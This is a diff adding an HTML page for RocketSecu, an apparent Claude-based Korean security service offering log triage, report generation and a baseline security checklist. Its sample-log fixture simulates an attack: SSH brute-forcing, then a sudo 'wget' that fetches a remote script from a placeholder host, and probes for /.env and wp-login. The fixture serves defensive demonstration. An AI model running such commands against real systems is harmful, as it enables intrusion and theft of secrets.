@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>RocketSecu 서비스 | AI 로그 분석·보고서·보안 점검</title>
+<meta name="description" content="RocketSecu의 Claude 기반 보안 서비스를 바로 써 보세요. 로그 분석, 보고서 자동 작성, 보안 기본 점검을 제공합니다.">
+<meta name="theme-color" content="#c2410c">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 32 32%22%3E%3Crect width=%2232%22 height=%2232%22 rx=%228%22 fill=%22%23f97316%22/%3E%3C/svg%3E">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/variable/pretendardvariable-dynamic-subset.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@3.19.0/dist/tabler-icons.min.css">
+<style>
+:root {
+  --bg: #f4f4f5; --surface: #ffffff; --text: #18181b; --muted: #52525b;
+  --line: #e4e4e7; --accent: #c2410c; --accent-ink: #ffffff; --tint: #fff1e8;
+  --crit: #b91c1c; --high: #c2410c; --med: #b45309; --low: #15803d; --info: #52525b;
+  --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  --radius: 14px;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg: #0c0c0e; --surface: #17171a; --text: #f4f4f5; --muted: #a1a1aa;
+    --line: #27272a; --accent: #f97316; --accent-ink: #1c0a02; --tint: #2a1508;
+    --crit: #f87171; --high: #fb923c; --med: #fbbf24; --low: #4ade80; --info: #a1a1aa;
+  }
+}
+* { box-sizing: border-box; margin: 0; }
+body { background: var(--bg); color: var(--text); font-family: "Pretendard Variable", Pretendard, system-ui, sans-serif; line-height: 1.6; -webkit-font-smoothing: antialiased; word-break: keep-all; }
+a { color: inherit; text-decoration: none; }
+.wrap { max-width: 1040px; margin: 0 auto; padding: 0 24px; }
+
+.nav { height: 68px; display: flex; align-items: center; justify-content: space-between; gap: 16px; }
+.brand { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 1.15rem; letter-spacing: -0.02em; }
+.brand i { color: var(--accent); font-size: 1.5rem; }
+.brand small { font-weight: 600; color: var(--muted); font-size: .85rem; }
+.nav a.back { color: var(--muted); font-size: .95rem; }
+
+.head { padding: 32px 0 24px; }
+.head h1 { font-size: clamp(1.9rem, 4vw, 2.6rem); letter-spacing: -0.03em; line-height: 1.2; }
+.head p { margin-top: 10px; color: var(--muted); max-width: 60ch; }
+
+.access { display: flex; flex-wrap: wrap; align-items: center; gap: 10px; padding: 14px 16px; background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius); font-size: .92rem; }
+.access label { font-weight: 700; }
+.access input { width: 180px; }
+.access span { color: var(--muted); }
+
+.tabs { margin-top: 24px; display: flex; gap: 6px; border-bottom: 1px solid var(--line); overflow-x: auto; }
+.tabs button { flex: none; background: none; border: 0; border-bottom: 3px solid transparent; padding: 12px 14px; font: inherit; font-weight: 700; color: var(--muted); cursor: pointer; display: inline-flex; align-items: center; gap: 6px; }
+.tabs button[aria-selected="true"] { color: var(--text); border-bottom-color: var(--accent); }
+.tabs button:focus-visible { outline: 2px solid var(--accent); outline-offset: -2px; }
+
+.panel { padding: 28px 0 64px; }
+.panel[hidden] { display: none; }
+.lead { color: var(--muted); max-width: 64ch; }
+form { margin-top: 20px; display: grid; gap: 14px; }
+.field { display: grid; gap: 6px; }
+.field label, legend { font-weight: 700; font-size: .95rem; }
+.hint { color: var(--muted); font-size: .85rem; }
+input[type="text"], input[type="password"], textarea {
+  font: inherit; color: var(--text); background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 10px 12px; width: 100%;
+}
+textarea { font-family: var(--mono); font-size: .85rem; min-height: 220px; resize: vertical; }
+input:focus-visible, textarea:focus-visible { outline: 2px solid var(--accent); outline-offset: 1px; border-color: transparent; }
+.row { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
+
+.btn { display: inline-flex; align-items: center; gap: 8px; white-space: nowrap; padding: 12px 20px; border-radius: 999px; font: inherit; font-weight: 700; cursor: pointer; border: 1px solid transparent; transition: transform .2s cubic-bezier(.16,1,.3,1); }
+.btn:active { transform: scale(.97); }
+.btn-primary { background: var(--accent); color: var(--accent-ink); }
+.btn-ghost { background: none; border-color: var(--line); color: var(--text); }
+.btn:disabled { opacity: .6; cursor: progress; }
+.btn:focus-visible { outline: 2px solid var(--accent); outline-offset: 3px; }
+
+.notice { display: flex; gap: 8px; align-items: flex-start; font-size: .88rem; color: var(--muted); }
+.notice i { color: var(--accent); margin-top: 3px; }
+.error { margin-top: 16px; padding: 12px 16px; border-radius: 10px; border: 1px solid var(--crit); color: var(--crit); background: var(--surface); }
+.error:empty { display: none; }
+
+/* 결과 */
+.result { margin-top: 28px; display: grid; gap: 14px; }
+.result:empty { display: none; }
+.card { background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius); padding: 22px 24px; }
+.card h2 { font-size: 1.25rem; letter-spacing: -0.02em; }
+.card h3 { font-size: 1.05rem; letter-spacing: -0.01em; }
+.card p { margin-top: 6px; }
+.card .muted { color: var(--muted); font-size: .9rem; }
+.card ul, .card ol { margin-top: 8px; padding-left: 20px; }
+.badge { display: inline-block; font-size: .75rem; font-weight: 800; padding: 3px 9px; border-radius: 6px; border: 1px solid currentColor; vertical-align: middle; }
+.sev-critical { color: var(--crit); } .sev-high { color: var(--high); } .sev-medium { color: var(--med); }
+.sev-low { color: var(--low); } .sev-info { color: var(--info); }
+.finding { border-left: 4px solid currentColor; }
+.finding .title { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; color: var(--text); }
+.finding dl { margin-top: 10px; display: grid; grid-template-columns: 80px 1fr; gap: 6px 12px; color: var(--text); font-size: .93rem; }
+.finding dt { color: var(--muted); }
+.finding code { font-family: var(--mono); font-size: .8rem; background: var(--bg); padding: 2px 6px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
+.review { margin-top: 10px; font-size: .85rem; font-weight: 700; color: var(--accent); }
+
+/* 점검표 */
+fieldset { border: 1px solid var(--line); border-radius: var(--radius); background: var(--surface); padding: 16px 20px; }
+legend { padding: 0 6px; }
+.check { display: grid; grid-template-columns: 1fr auto; gap: 12px; align-items: center; padding: 10px 0; }
+.check + .check { border-top: 1px solid var(--line); }
+.choices { display: flex; gap: 4px; }
+.choices label { cursor: pointer; }
+.choices input { position: absolute; opacity: 0; pointer-events: none; }
+.choices span { display: inline-block; padding: 6px 10px; border: 1px solid var(--line); border-radius: 8px; font-size: .85rem; font-weight: 600; }
+.choices input:checked + span { background: var(--accent); color: var(--accent-ink); border-color: var(--accent); }
+.choices input:focus-visible + span { outline: 2px solid var(--accent); outline-offset: 2px; }
+.score { position: sticky; bottom: 12px; display: flex; justify-content: space-between; align-items: center; gap: 12px; flex-wrap: wrap; padding: 12px 16px; background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius); box-shadow: 0 10px 30px -18px rgba(0,0,0,.4); }
+.score b { font-size: 1.3rem; }
+.bars { display: grid; gap: 8px; margin-top: 12px; }
+.bar { display: grid; grid-template-columns: 110px 1fr 44px; gap: 10px; align-items: center; font-size: .9rem; }
+.bar div { height: 8px; border-radius: 99px; background: var(--bg); overflow: hidden; }
+.bar div i { display: block; height: 100%; background: var(--accent); }
+
+footer { padding: 24px 0 40px; border-top: 1px solid var(--line); color: var(--muted); font-size: .88rem; }
+
+@media (max-width: 640px) {
+  .wrap { padding: 0 16px; }
+  .check { grid-template-columns: 1fr; }
+  .finding dl { grid-template-columns: 1fr; }
+  .bar { grid-template-columns: 90px 1fr 40px; }
+}
+
+/* 보고서 인쇄: 보고서만 PDF로 저장 */
+@media print {
+  body { background: #fff; color: #000; }
+  .nav, .head, .access, .tabs, form, .lead, .no-print, footer, .panel:not(#panel-report) { display: none !important; }
+  .card { border: 0; padding: 0 0 12px; }
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="nav">
+    <a class="brand" href="./"><i class="ti ti-rocket" aria-hidden="true"></i>RocketSecu <small>로켓시큐</small></a>
+    <a class="back" href="./">← 홈으로</a>
+  </header>
+
+  <section class="head">
+    <h1>RocketSecu 서비스 바로 쓰기</h1>
+    <p>Claude가 보안 로그를 읽고, 보고서를 쓰고, 우리 회사의 보안 수준을 진단합니다. 결과는 참고용이며, 영향이 큰 조치는 담당자가 확인한 뒤 실행하세요.</p>
+  </section>
+
+  <div class="access">
+    <label for="access-code">이용 코드</label>
+    <input id="access-code" type="password" autocomplete="off" placeholder="데모 신청 후 받은 코드">
+    <span>코드가 없으면 <a href="mailto:rocketsecu@aplusnet.net?subject=RocketSecu%20%EC%9D%B4%EC%9A%A9%20%EC%BD%94%EB%93%9C%20%EC%8B%A0%EC%B2%AD" style="color:var(--accent)">rocketsecu@aplusnet.net</a>으로 신청하세요.</span>
+  </div>
+
+  <div class="tabs" role="tablist" aria-label="서비스">
+    <button role="tab" id="tab-triage" aria-controls="panel-triage" aria-selected="true"><i class="ti ti-list-search" aria-hidden="true"></i>AI 로그 분석</button>
+    <button role="tab" id="tab-report" aria-controls="panel-report" aria-selected="false" tabindex="-1"><i class="ti ti-file-certificate" aria-hidden="true"></i>보고서 자동 작성</button>
+    <button role="tab" id="tab-compliance" aria-controls="panel-compliance" aria-selected="false" tabindex="-1"><i class="ti ti-checklist" aria-hidden="true"></i>보안 기본 점검</button>
+  </div>
+
+  <!-- 1. 로그 분석 -->
+  <section class="panel" id="panel-triage" role="tabpanel" aria-labelledby="tab-triage">
+    <p class="lead">서버, 방화벽, 웹 서버 로그를 붙여 넣으세요. 위험한 것부터 정리하고, 무엇을 해야 하는지 알려 드립니다.</p>
+    <form id="form-triage">
+      <div class="field">
+        <label for="triage-env">환경 설명 <span class="hint">(선택)</span></label>
+        <input id="triage-env" type="text" maxlength="500" placeholder="예: Ubuntu 웹 서버 1대, nginx, 쇼핑몰 운영">
+      </div>
+      <div class="field">
+        <label for="triage-logs">로그</label>
+        <textarea id="triage-logs" required maxlength="100000" placeholder="로그를 붙여 넣으세요 (최대 10만 자)"></textarea>
+      </div>
+      <p class="notice"><i class="ti ti-eye-off" aria-hidden="true"></i>이메일, 전화번호, 주민등록번호, 비밀번호, 토큰 같은 값은 AI로 보내기 전에 자동으로 가립니다.</p>
+      <div class="row">
+        <button class="btn btn-primary" type="submit"><i class="ti ti-sparkles" aria-hidden="true"></i>분석하기</button>
+        <button class="btn btn-ghost" type="button" id="triage-sample">샘플 로그 넣기</button>
+      </div>
+    </form>
+    <div class="error" role="alert" id="triage-error"></div>
+    <div class="result" id="triage-result" aria-live="polite"></div>
+  </section>
+
+  <!-- 2. 보고서 -->
+  <section class="panel" id="panel-report" role="tabpanel" aria-labelledby="tab-report" hidden>
+    <p class="lead">점검 결과나 메모를 넣으면 경영진용 요약과 실무자용 조치 목록이 담긴 보고서를 만듭니다. PDF로 저장할 수 있습니다.</p>
+    <form id="form-report">
+      <div class="row">
+        <div class="field" style="flex:1 1 220px">
+          <label for="report-company">회사 이름</label>
+          <input id="report-company" type="text" maxlength="100" placeholder="예: 로켓쇼핑">
+        </div>
+        <div class="field" style="flex:2 1 320px">
+          <label for="report-scope">점검 범위 <span class="hint">(선택)</span></label>
+          <input id="report-scope" type="text" maxlength="1000" placeholder="예: 웹 서버 1대, 11월 1주 로그">
+        </div>
+      </div>
+      <div class="field">
+        <label for="report-findings">점검 결과</label>
+        <textarea id="report-findings" required maxlength="60000" placeholder="발견한 문제를 적거나, 로그 분석 탭에서 '이 결과로 보고서 만들기'를 누르세요"></textarea>
+      </div>
+      <div class="row">
+        <button class="btn btn-primary" type="submit"><i class="ti ti-file-text" aria-hidden="true"></i>보고서 만들기</button>
+      </div>
+    </form>
+    <div class="error" role="alert" id="report-error"></div>
+    <div class="result" id="report-result" aria-live="polite"></div>
+  </section>
+
+  <!-- 3. 보안 기본 점검 -->
+  <section class="panel" id="panel-compliance" role="tabpanel" aria-labelledby="tab-compliance" hidden>
+    <p class="lead">19개 질문에 답하면 영역별 점수와 우선 개선할 일을 알려 드립니다. ISMS-P 같은 인증 준비의 출발점으로 쓰세요. 인증 심사를 대신하지는 않습니다.</p>
+    <form id="form-compliance">
+      <div class="field">
+        <label for="comp-profile">회사 정보 <span class="hint">(선택)</span></label>
+        <input id="comp-profile" type="text" maxlength="500" placeholder="예: 직원 20명, 온라인 쇼핑몰, 고객 개인정보 보관">
+      </div>
+      <div id="checklist" class="field" style="gap:14px"></div>
+      <div class="score">
+        <span>현재 점수 <b id="live-score">0</b>점 · <span id="answered">0</span>/<span id="total-items">0</span> 답변</span>
+        <button class="btn btn-primary" type="submit"><i class="ti ti-stethoscope" aria-hidden="true"></i>AI 진단 받기</button>
+      </div>
+    </form>
+    <div class="error" role="alert" id="compliance-error"></div>
+    <div class="result" id="compliance-result" aria-live="polite"></div>
+  </section>
+
+  <footer>© RocketSecu 로켓시큐 · 분석 결과는 Claude가 만든 참고 자료이며, 전문가 검수가 필요하면 rocketsecu@aplusnet.net으로 문의하세요.</footer>
+</div>
+
+<script type="module">
+import { CHECKLIST, ITEMS, STATUSES, scoreAnswers } from "./lib/checklist.js";
+
+const SEVERITY = { critical: "긴급", high: "높음", medium: "보통", low: "낮음", info: "정보" };
+const PRIORITY = { immediate: "즉시", within_1_week: "1주 안", within_1_month: "1달 안", within_3_months: "3달 안" };
+const MATURITY = { initial: "초기", developing: "구축 중", defined: "체계 갖춤", managed: "관리 단계" };
+const MASK_LABEL = { EMAIL: "이메일", PHONE: "전화번호", RRN: "주민등록번호", CARD: "카드번호", SECRET: "비밀값", TOKEN: "토큰", AWS_KEY: "AWS 키", PRIVATE_KEY: "개인키" };
+const $ = (id) => document.getElementById(id);
+
+// 모델 결과는 textContent로만 넣어서 HTML이 실행되지 않게 합니다.
+function el(tag, props = {}, children = []) {
+  const node = document.createElement(tag);
+  for (const [key, value] of Object.entries(props)) {
+    if (key === "text") node.textContent = value;
+    else if (key === "class") node.className = value;
+    else node.setAttribute(key, value);
+  }
+  for (const child of [].concat(children)) if (child) node.append(child);
+  return node;
+}
+const badge = (sev) => el("span", { class: `badge sev-${sev}`, text: SEVERITY[sev] || sev });
+const list = (items, ordered = false) => el(ordered ? "ol" : "ul", {}, items.map((t) => el("li", { text: t })));
+
+// 이용 코드는 이 브라우저에만 저장합니다.
+const codeInput = $("access-code");
+try { codeInput.value = localStorage.getItem("rs-access") || ""; } catch {}
+codeInput.addEventListener("change", () => { try { localStorage.setItem("rs-access", codeInput.value); } catch {} });
+
+async function callApi(path, body, form, errorBox) {
+  const button = form.querySelector('button[type="submit"]');
+  const label = button.innerHTML;
+  errorBox.textContent = "";
+  button.disabled = true;
+  button.textContent = "분석 중… (최대 1~2분)";
+  try {
+    const res = await fetch(path, {
+      method: "POST",
+      headers: { "content-type": "application/json", "x-access-code": codeInput.value.trim() },
+      body: JSON.stringify(body),
+    });
+    const data = await res.json().catch(() => ({ error: "서버 응답을 읽지 못했습니다." }));
+    if (!res.ok) throw new Error(data.error || `오류 ${res.status}`);
+    return data;
+  } catch (error) {
+    errorBox.textContent = error.message === "Failed to fetch" ? "서버에 연결하지 못했습니다. 잠시 후 다시 시도해 주세요." : error.message;
+    return null;
+  } finally {
+    button.disabled = false;
+    button.innerHTML = label;
+  }
+}
+
+/* 탭 */
+const tabs = [...document.querySelectorAll('[role="tab"]')];
+function selectTab(tab, focus = false) {
+  for (const t of tabs) {
+    const on = t === tab;
+    t.setAttribute("aria-selected", on);
+    t.tabIndex = on ? 0 : -1;
+    $(t.getAttribute("aria-controls")).hidden = !on;
+  }
+  if (focus) tab.focus();
+  history.replaceState(null, "", `#${tab.id.replace("tab-", "")}`);
+}
+tabs.forEach((tab, i) => {
+  tab.addEventListener("click", () => selectTab(tab));
+  tab.addEventListener("keydown", (e) => {
+    const step = { ArrowRight: 1, ArrowLeft: -1 }[e.key];
+    if (step) selectTab(tabs[(i + step + tabs.length) % tabs.length], true);
+  });
+});
+const initial = tabs.find((t) => t.id === `tab-${location.hash.slice(1)}`);
+if (initial) selectTab(initial);
+
+/* 1. 로그 분석 */
+$("triage-sample").addEventListener("click", () => {
+  $("triage-env").value = "Ubuntu 22.04 웹 서버, nginx, 쇼핑몰 운영";
+  $("triage-logs").value = [
+    "Nov  2 03:12:01 web1 sshd[2131]: Failed password for root from 203.0.113.24 port 51022 ssh2",
+    "Nov  2 03:12:03 web1 sshd[2131]: Failed password for root from 203.0.113.24 port 51040 ssh2",
+    "Nov  2 03:12:05 web1 sshd[2133]: Failed password for invalid user admin from 203.0.113.24 port 51061 ssh2",
+    "Nov  2 03:14:44 web1 sshd[2190]: Accepted password for deploy from 203.0.113.24 port 51302 ssh2",
+    "Nov  2 03:15:10 web1 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.7/x.sh",
+    '198.51.100.7 - - [02/Nov/2026:03:20:11 +0900] "GET /wp-login.php HTTP/1.1" 404 153',
+    '198.51.100.7 - - [02/Nov/2026:03:20:12 +0900] "GET /.env HTTP/1.1" 404 153',
+    '192.0.2.10 - - [02/Nov/2026:09:01:45 +0900] "POST /api/login HTTP/1.1" 200 512 "-" "Mozilla/5.0" email=customer@example.com',
+    "Nov  2 04:00:00 web1 CRON[3001]: (root) CMD (/usr/local/bin/backup.sh) - backup completed",
+  ].join("\n");
+});
+
+let lastTriage = null;
+$("form-triage").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const out = $("triage-result");
+  const data = await callApi("/api/triage", { logs: $("triage-logs").value, environment: $("triage-env").value }, e.target, $("triage-error"));
+  if (!data) return;
+  lastTriage = data;
+  const masked = Object.entries(data.masked || {}).map(([k, n]) => `${MASK_LABEL[k] || k} ${n}건`).join(", ");
+  out.replaceChildren(
+    el("div", { class: "card" }, [
+      el("h2", {}, [badge(data.overall_risk), " 분석 요약"]),
+      el("p", { text: data.summary }),
+      masked ? el("p", { class: "muted", text: `가린 값: ${masked}` }) : null,
+    ]),
+    ...data.findings.map((f) => el("article", { class: `card finding sev-${f.severity}` }, [
+      el("div", { class: "title" }, [badge(f.severity), el("h3", { text: f.title })]),
+      el("dl", {}, [
+        el("dt", { text: "근거" }), el("dd", {}, el("code", { text: f.evidence })),
+        el("dt", { text: "왜 위험한가" }), el("dd", { text: f.explanation }),
+        el("dt", { text: "할 일" }), el("dd", { text: f.recommendation }),
+      ]),
+      f.needs_human_review ? el("p", { class: "review", text: "⚠ 영향이 큰 조치입니다. 담당자가 확인한 뒤 실행하세요." }) : null,
+    ])),
+    data.next_checks?.length ? el("div", { class: "card" }, [el("h3", { text: "추가로 확인할 것" }), list(data.next_checks)]) : null,
+    el("div", { class: "row no-print" }, el("button", { class: "btn btn-ghost", type: "button", id: "to-report", text: "이 결과로 보고서 만들기 →" })),
+  );
+  $("to-report").addEventListener("click", () => {
+    $("report-findings").value = [
+      `요약: ${lastTriage.summary}`,
+      ...lastTriage.findings.map((f) => `- [${SEVERITY[f.severity]}] ${f.title}\n  근거: ${f.evidence}\n  설명: ${f.explanation}\n  권장 조치: ${f.recommendation}`),
+    ].join("\n");
+    selectTab($("tab-report"), true);
+  });
+});
+
+/* 2. 보고서 */
+$("form-report").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const data = await callApi("/api/report", {
+    company: $("report-company").value, scope: $("report-scope").value, findings: $("report-findings").value,
+  }, e.target, $("report-error"));
+  if (!data) return;
+  const date = new Date(data.generated_at).toLocaleDateString("ko-KR");
+  $("report-result").replaceChildren(
+    el("div", { class: "card" }, [
+      el("p", { class: "muted", text: `${data.company} · ${date} · RocketSecu` }),
+      el("h2", { text: data.title }),
+      el("p", {}, ["종합 위험도 ", badge(data.risk_rating)]),
+    ]),
+    el("div", { class: "card" }, [el("h3", { text: "경영진 요약" }), el("p", { text: data.executive_summary })]),
+    ...data.items.map((item, i) => el("article", { class: `card finding sev-${item.severity}` }, [
+      el("div", { class: "title" }, [badge(item.severity), el("h3", { text: `${i + 1}. ${item.title}` })]),
+      el("dl", {}, [
+        el("dt", { text: "영향" }), el("dd", { text: item.impact }),
+        el("dt", { text: "조치" }), el("dd", { text: item.action }),
+        el("dt", { text: "기한" }), el("dd", { text: PRIORITY[item.priority] || item.priority }),
+        el("dt", { text: "담당" }), el("dd", { text: item.owner_role }),
+      ]),
+    ])),
+    el("div", { class: "card" }, [el("h3", { text: "개선 로드맵" }), list(data.roadmap, true)]),
+    el("p", { class: "muted", text: "이 보고서는 Claude가 작성한 초안입니다. 고객 전달 전 보안 전문가 검수를 권장합니다." }),
+    el("div", { class: "row no-print" }, el("button", { class: "btn btn-primary", type: "button", id: "print-report", text: "PDF로 저장 / 인쇄" })),
+  );
+  $("print-report").addEventListener("click", () => window.print());
+});
+
+/* 3. 보안 기본 점검 */
+const answers = {};
+$("total-items").textContent = ITEMS.length;
+$("checklist").replaceChildren(...CHECKLIST.map(({ domain, items }) => el("fieldset", {}, [
+  el("legend", { text: domain }),
+  ...items.map(({ id, text }) => el("div", { class: "check" }, [
+    el("span", { id: `q-${id}`, text }),
+    el("div", { class: "choices", role: "radiogroup", "aria-labelledby": `q-${id}` }, Object.entries(STATUSES).map(([value, label]) =>
+      el("label", {}, [el("input", { type: "radio", name: id, value }), el("span", { text: label })]))),
+  ])),
+])));
+$("checklist").addEventListener("change", (e) => {
+  answers[e.target.name] = e.target.value;
+  $("live-score").textContent = scoreAnswers(answers).total;
+  $("answered").textContent = Object.keys(answers).length;
+});
+
+$("form-compliance").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const missing = ITEMS.length - Object.keys(answers).length;
+  if (missing) { $("compliance-error").textContent = `아직 답하지 않은 항목이 ${missing}개 있습니다.`; return; }
+  const data = await callApi("/api/compliance", { answers, profile: $("comp-profile").value }, e.target, $("compliance-error"));
+  if (!data) return;
+  const textById = Object.fromEntries(ITEMS.map((i) => [i.id, i.text]));
+  $("compliance-result").replaceChildren(
+    el("div", { class: "card" }, [
+      el("h2", { text: `보안 점수 ${data.score.total}점 · ${MATURITY[data.maturity] || data.maturity}` }),
+      el("p", { text: data.overall }),
+      el("div", { class: "bars" }, data.score.byDomain.map(({ domain, score }) => el("div", { class: "bar" }, [
+        el("span", { text: domain }), el("div", {}, el("i", { style: `width:${score}%` })), el("b", { text: String(score) }),
+      ]))),
+    ]),
+    data.quick_wins.length ? el("div", { class: "card" }, [el("h3", { text: "이번 주에 바로 할 일" }), list(data.quick_wins)]) : null,
+    ...data.gaps.map((g) => el("article", { class: "card" }, [
+      el("div", { class: "row" }, [el("span", { class: "badge sev-high", text: PRIORITY[g.priority] || g.priority }), el("h3", { text: textById[g.item_id] })]),
+      el("p", {}, [el("b", { text: "위험: " }), g.risk]),
+      el("p", {}, [el("b", { text: "개선: " }), g.action]),
+    ])),
+  );
+});
+</script>
+</body>
+</html>
